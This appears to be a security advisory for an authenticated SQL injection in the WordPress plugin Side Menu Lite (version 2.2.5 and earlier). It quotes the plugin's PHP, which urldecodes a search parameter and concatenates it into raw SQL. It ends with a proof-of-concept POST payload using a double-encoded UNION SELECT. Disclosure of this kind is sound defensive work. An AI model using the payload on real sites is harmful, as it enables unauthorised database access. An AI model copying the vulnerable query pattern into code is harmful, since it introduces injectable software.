# Side Menu Lite <= 2.2.5 - Authenticated SQL Injection
## Description
    The function get_search() of plugin Side Menu Lite urldecode the user's input data, therefor leading a SQL Injection issue.  
## Affects Plugins
    Side Menu Lite <= 2.2.5 (the latest version at this time)
    https://wordpress.org/plugins/side-menu-lite/
## Author
    pang0lin@webray.com.cn inc 
## Detail
    The issue occured in file \plugins\side-menu-lite\admin\partials\class-list-table.php. The function  get_search() urldecode user's input parameter s.
```
	public function get_search() {
		return ! empty( $_POST['s'] ) ? urldecode( trim( $_POST['s'] ) ) : false;
	}
```
  And it is used in function table_data().
```
	private function table_data() {
		global $wpdb;
		$data   = array();
		$paged  = $this->get_paged();
		$offset = $this->per_page * ( $paged - 1 );
		$search = $this->get_search();

		$table = $this->data;


		if ( ! $search || empty( $search ) ) {
			$result = $wpdb->get_results( "SELECT * FROM " . $table . " order by id desc" );
		} elseif ( is_numeric( $search ) ) {
			$result = $wpdb->get_results( "SELECT * FROM " . $table . " WHERE id=" . $search );
		} else {
			$result = $wpdb->get_results( "SELECT * FROM " . $table . " WHERE title='" . $search
			                              . "' order by id desc" );
		}
    ...
```
  We can see that the variable $search is finnally goes into the SQL query which result the SQL injection.
## Proof of Concept
http://192.168.65.26/wp/wp-admin/admin.php?page=side-menu-lite&tab=list
POST:
s=aaaa%2527 union select 1,user(),3 -- a

![blockchain](https://github.com/pang0lin/CVEproject/blob/main/imgs/wordpress_side-menu-lite_sqli.png "Wordpress plugin side-menu-lite sqli")
